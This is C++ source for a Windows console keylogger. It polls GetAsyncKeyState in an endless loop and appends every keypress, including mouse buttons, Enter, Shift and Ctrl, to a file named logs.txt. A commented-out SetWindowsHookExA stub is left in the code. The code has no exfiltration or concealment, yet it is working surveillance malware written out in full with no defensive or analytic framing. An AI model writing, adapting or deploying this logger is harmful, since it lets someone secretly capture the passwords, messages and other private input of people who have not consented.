// keyLogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <WinUser.h>

void logger(int key, char* file);

int main(int argc, _TCHAR* argv[])
{
	char* file_name = "logs.txt";
	/* HHOOK SetWindowsHookExA(
	int       13,
	HOOKPROC  lpfn,
	HINSTANCE NULL,
	DWORD     0
	); */

	while (true){
		for (int key = 8; key < 128; key++){
			if (GetAsyncKeyState(key) == -32767){
				if (key > 64 && key < 91 && !(GetAsyncKeyState(0x10)))
				{
					key = key + 32;
					logger(key, file_name);
				}
				else
				{
					logger(key, file_name);
				}
			}
		}
	}
	return 0;
}

void logger(int key, char* filename){
	char key_pressed[30];
	std::ofstream myfile;
	myfile.open(filename, std::ios::app);
	switch (key)
	{
	case VK_LBUTTON:
		strcpy_s(key_pressed, "[LEFT_MOUSE]");
		myfile << key_pressed;
		break;
	case VK_RBUTTON:
		strcpy_s(key_pressed, "[RIGHT_MOUSE]");
		myfile << key_pressed;
		break;
	case VK_BACK:
		strcpy_s(key_pressed, "[BACKSPACE]");
		myfile << key_pressed;
		break;
	case VK_TAB:
		strcpy_s(key_pressed, "[TAB]");
		myfile << key_pressed;
		break;
	case VK_RETURN:
		strcpy_s(key_pressed, "[ENTER]");
		myfile << key_pressed;
		break;
	case VK_SPACE:
		strcpy_s(key_pressed, "[SPACE]");
		myfile << key_pressed;
		break;
	case VK_SHIFT:
		strcpy_s(key_pressed, "[SHIFT]");
		myfile << key_pressed;
		break;
	case VK_CONTROL:
		strcpy_s(key_pressed, "[CTRL]");
		myfile << key_pressed;
		break;
	default:
		myfile << char(key);
		break;
	}
	myfile.close();
}